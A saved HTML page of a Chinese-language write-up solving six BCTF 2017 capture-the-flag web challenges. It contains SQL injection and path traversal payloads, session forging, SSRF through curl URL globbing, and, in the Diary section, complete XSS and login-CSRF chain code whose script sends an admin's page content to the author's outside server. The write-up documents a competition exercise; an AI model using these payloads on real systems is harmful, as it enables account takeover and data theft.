@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://blog.cal1.cn/post/BCTF%202017%20web%20writeup -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCTF 2017 web writeup - crblog</title>
+    
+    <!--<link href="//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">-->
+    <link href="./BCTF 2017 web writeup - crblog_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./BCTF 2017 web writeup - crblog_files/yue.css" rel="stylesheet">
+    <link href="./BCTF 2017 web writeup - crblog_files/style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="https://blogstatic-1252090343.cosgz.myqcloud.com/h1209.png">
+</head>
+<body>
+<nav class="navbar navbar-default navbar-static-top">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://blog.cal1.cn/">crblog</a>
+        </div>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="nav navbar-nav">
+                <li><a href="https://blog.cal1.cn/">主页</a></li>
+                <li><a href="https://blog.cal1.cn/archive">归档</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li><a href="https://blog.cal1.cn/link">关于</a></li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<div class="container yue">
+    
+    <div class="page-header">
+        <h1>BCTF 2017 web writeup</h1><span>发表于 2017年4月19日</span>
+    </div>
+    
+        <p>按题目质量从低到高排序。</p>
+<h2>admin only</h2>
+<p>找回密码的用户名处填入 admin ，返回 admin 的密码的 md5 。登录后注意到 <code>Set-Cookie: identity=ee11cbb19052e40b07aac0ca060c23ee</code> ，是 "user" 的 md5 。修改为 admin 后页面返回 "insweb17", 结合题目描述，在 GitHub 上找到该用户，下载 share 项目里的文件，观察到是个 apk ，反编译 dex 后在 <code>hello/test/athis/myapplication/C0149h.java</code> 里得到加密方式 AES/ECB/PKCS5Padding 、密钥和密文，解密得到 flag。</p>
+<h2>Baby SQLi &amp; Kitty Shop</h2>
+<p>简单的登录功能，用户名 <code>admin'#</code> 即可登录，可以推测 SQL 语句是</p>
+<pre><code class="sql">SELECT * FROM foo WHERE username='' and password='';
+</code></pre>
+
+<p>购买页面提示库存里有 4 个物品，而 manual 里说有 a/b/c 三个物品，购买物品 d 就能获得一个 flag。</p>
+<p>manual 的下载是向 load.php POST 文件名实现的，测试发现 <code>manual</code> 与 <code>./manual</code> 返回的内容相同，猜测可以读取任意文件，读到 <code>../.viminfo</code> ，得到 <code>~/app/encrypt0p@ssword/password</code> 。</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170418223830.png"></p>
+<p>最后在 <code>../../../../backup/client.zip</code> 得到一个压缩包，交给二进制选手得到 flag。这里必须吐槽这个 viminfo ，强行出题是什么味儿？恶臭。</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170418224134.png"></p>
+<h2>signature</h2>
+<p>扫一扫目录发现有个 <code>/user_guide/</code>，确定是 CI 框架后，根据目录结构在 <code>/application/controllers/</code> 下发现 <code>blog_backup_2014.php</code>，结合提示 "take care of the keys" 在 Github 上搜索这个文件名可以找到 <code>https://github.com/xiaobaozidi/bbbccctttffff</code>。由于 session 根据 key 生成，所以可以本地搭起来，构造出登录 admin 后的 session 。</p>
+<p>登录后通过盲注获得数据：
+<img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170418235821.png"></p>
+<p>sourcekey 表</p>
+<table>
+<thead>
+<tr>
+<th>Bankname</th>
+<th>MD5_key</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CBC</td>
+<td>02359dc1a4d2612aac83872031d970b9</td>
+</tr>
+<tr>
+<td>CMB</td>
+<td>6c35ebc95955c672ead533295587fe07</td>
+</tr>
+<tr>
+<td>CSB</td>
+<td>abb0a201345974f3dbf641ea2f8686cb</td>
+</tr>
+<tr>
+<td>HSBC</td>
+<td>073a6ab30b859e326719e18a35de17b4</td>
+</tr>
+</tbody>
+</table>
+<p>payment 表</p>
+<table>
+<thead>
+<tr>
+<th>UserID</th>
+<th>BillNo</th>
+<th>Bankname</th>
+<th>ServiceType</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C33506</td>
+<td>45156890612662948</td>
+<td>HSBC</td>
+<td>CARD_PAY</td>
+</tr>
+</tbody>
+</table>
+<p>payment 表唯独缺 <code>index.php/payment</code> 表单的最后一项 signature ，在源码中找到计算 signature 的函数</p>
+<pre><code class="php">function tosignature($userid, $bankname, $billno, $servicetype, $md5_key){
+    $arr = array($userid, $bankname, $billno, $servicetype, $md5_key);
+    return md5(join('&amp;', $arr));
+}
+</code></pre>
+
+<p>这里需要计算 md5 ，所以盲注时要用 <code>like binary</code> 获得大小写正确的数据。</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419001314.png"></p>
+<h2>Alice and Bob</h2>
+<p>题目摆明是个 SQL 注入，在 Alice 后加一个单引号可以看到错误信息。<code>Alice'#</code> 与 <code>Alice</code> 的结果相同，推测 SQL 语句是</p>
+<pre><code>SELECT * FROM foo WHERE name='';
+</code></pre>
+
+<p>尝试 <code>0' union select '#</code> 发现有 WAF ，而 <code>0 union select '#</code> 却没有被 WAF 拦截，说明这并不是传统的正则 WAF 。尝试多种姿势后感觉这个 WAF 似乎很聪明呢，只拦截具有攻击性的 Payload 。试着多句执行，发送 <code>Alice';</code> 居然返回 HTTP 500 ，而 <code>Alice';#</code> 返回正常的结果，怕是可以多句执行。</p>
+<p>于是用 <code>Alice';show tables;#</code> 和 <code>Alice';show 123;#</code> 进行验证，前者正常返回，后者 500 。确定了，可以多句执行，错误时会返回 500。用我们的 2*1e308 报错大法盲注即可：</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419004654.png"></p>
+<h2>Diary</h2>
+<p>火日师傅出的 Diary 和 Paint 这两题我给满分。一看到在另一个域名进行身份认证，我就猜到八成是 <a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/">Turning Self-XSS into Good-XSS</a> 的复现了。</p>
+<p>Diary 处可以利用 HTML 实体编码绕过 filter 构造出 Self-XSS ；Bug Report 仅能提交当前域的链接，利用 phithon 师傅的 <a href="https://docs.djangoproject.com/en/1.10/releases/1.10.7/#cve-2017-7234-open-redirect-vulnerability-in-django-views-static-serve">CVE-2017-7234</a> 可以实现任意地址跳转。</p>
+<p>构造恶意页面，先让 admin 在 diary 域下注销，同时利用 CSP 拦截注销 auth 域登录状态的请求，从而保留 auth 域的登录状态。然后用构造好 Self-XSS 的帐号的 auth code 登录 diary 域，触发 Self-XSS ，此时我们已经可以在 diary 域下执行任意 JS 代码了。创建一个 iframe ，用相同的方法注销 diary 域的登录状态，利用 auth 域的登录信息重新以 admin 的身份登录 diary 域，向 Survey POST 后传回即可获得 flag 。详细的解释请参考原文，整个攻击流程非常优雅，可以说令人拍案叫绝了。</p>
+<p>贴上我的 Payload 和代码们：</p>
+<p><code>http://diary.bctf.xctf.org.cn/static/%5c%5cx.cal1.cn/_fire/1.html</code></p>
+<p>1.html 负责注销 diary 域，登录恶意帐号，跳转到 diary 页面触发 Self-XSS</p>
+<pre><code class="html">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn"&gt;
+&lt;script src="http://diary.bctf.xctf.org.cn/static/js/jquery.min.js"&gt;&lt;/script&gt;
+&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout" onerror="tologin();"&gt;
+&lt;script&gt;
+    var tologin = function(){
+        document.body.innerHTML='&lt;img src="http://diary.bctf.xctf.org.cn/accounts/login" onerror="toreceive();"&gt;'
+    }
+    var toreceive = function(){
+        document.body.innerHTML='&lt;img src="http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code=B2pYAmGDggQWWD9UoXYSHzqDgRV300" onerror="bye();"&gt;'
+    }
+    var bye = function(){
+        window.location='http://diary.bctf.xctf.org.cn/diary/'
+    }
+&lt;/script&gt;
+</code></pre>
+
+<p>diary 页面有我们绕过 filter 后构造的 XSS 
+<code>filters("&lt;img src=/1&amp;#34;&amp;#32;onerror=&amp;#34;$.getScript('//x.cal1.cn/fire/2.js')&gt;")</code></p>
+<p>2.js 负责创建 iframe，调用 3.html，在 3.html 载入完成后向 survey 发送 POST 请求，并传回内容</p>
+<pre><code class="html">var i = document.createElement('iframe');
+i.setAttribute('src', 'http://x.cal1.cn/_fire/3.html');
+document.body.appendChild(i);
+setTimeout(function(){
+    i = window.frames[0]
+    i.location.href = '/survey/'
+    setTimeout(function(){
+        csrftoken = i.$('body &gt; div.container &gt; form &gt; input[type="hidden"]')[0].value
+        i.$.post('/survey/', data={rate:5, suggestion:'ok', csrfmiddlewaretoken:csrftoken}).then(function(data){$.post('//x.cal1.cn:62001', data={a:escape(data)})})
+    },3000)
+},3000)
+</code></pre>
+
+<p>3.html 负责注销 diary 域，利用 auth 域的登录状态在 diary 域重新登录 admin 的帐号</p>
+<pre><code class="html">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn"&gt;
+&lt;script src="http://diary.bctf.xctf.org.cn/static/js/jquery.min.js"&gt;&lt;/script&gt;
+&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout" onerror="redir();"&gt;
+&lt;script&gt;
+    var redir = function(){
+        window.location = 'http://diary.bctf.xctf.org.cn/accounts/login'
+    }
+&lt;/script&gt;
+</code></pre>
+
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419011851.png"></p>
+<h2>Paint</h2>
+<p>upload.php 可以上传任意内容的文件，扩展名只能是图片类的。本地用户访问 flag.php 可以获得 flag 。 image.php 可以传入 url ，服务端用 curl 取回内容，经过 GD 库处理后保存成图片，目标必须是图片才能成功保存，否则只返回长度，提示 "Not Image"。</p>
+<p>用指向 127.0.0.1 的域名可以绕过限制，也可以用 127.0.0.1/8 或者 0(0.0.0.0) 。</p>
+<pre><code class="bash">$ curl http://paint.bctf.xctf.org.cn/image.php -d "url=http://paint.bctf.xctf.org.cn/flag.php"
+{"files":{"size":80,"error":"Not Image"}}
+
+curl http://paint.bctf.xctf.org.cn/image.php -d "url=http://l.cal1.cn/flag.php"
+{"files":{"size":374,"error":"Not Image"}}
+</code></pre>
+
+<p>用 intruder fuzz 一下可用字符发现有 <code>[]</code> 和 <code>{}</code> ，试了下在 URL 中使用 <code>[1-2]</code> ，收到了两个请求</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419112120.png"></p>
+<p>而且 size 居然是两个返回内容合并之后的大小，做到这儿以为是命令注入，试了多种姿势并不行。重新查一下 <a href="https://curl.haxx.se/docs/manpage.html">curl 的文档</a>，发现了非常厉害的用法：</p>
+<pre><code>You can specify multiple URLs or parts of URLs by writing part sets within braces as in:
+  http://site.{one,two,three}.com
+or you can get sequences of alphanumeric series by using [] as in:
+  ftp://ftp.example.com/file[1-100].txt
+</code></pre>
+
+<p>也就是说我们可以让服务端 curl 多个地址，将多段内容拼接后再给 GD 库去处理。一开始我想用 <code>http://[1-3].cal1.cn/flag.php</code> ，将 1 与 3 指向自己的服务器，2 指向 127.0.0.1 进行拼接，然而 image.php 用正则检测域名是否合法。</p>
+<p>所以只能换用 <code>{}</code> ，用 https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE 生成一个经过 GD 库压缩后仍有长度为 374 的可控区域的 gif ，以这个长度为 374 的块为界限切割成两个文件，通过 upload.php 上传即可。</p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419114551.png"></p>
+<p><img alt="" src="./BCTF 2017 web writeup - crblog_files/截图20170419114706.png"></p>
+    
+
+</div>
+<footer class="footer">
+    <div class="container">
+        <div class="footer-collapse">
+            <span>chromium1337 # 2017</span>
+        </div>
+    </div>
+</footer>
+<script src="./BCTF 2017 web writeup - crblog_files/jquery.min.js"></script>
+<script src="./BCTF 2017 web writeup - crblog_files/bootstrap.min.js"></script>
+
+
+</body></html>
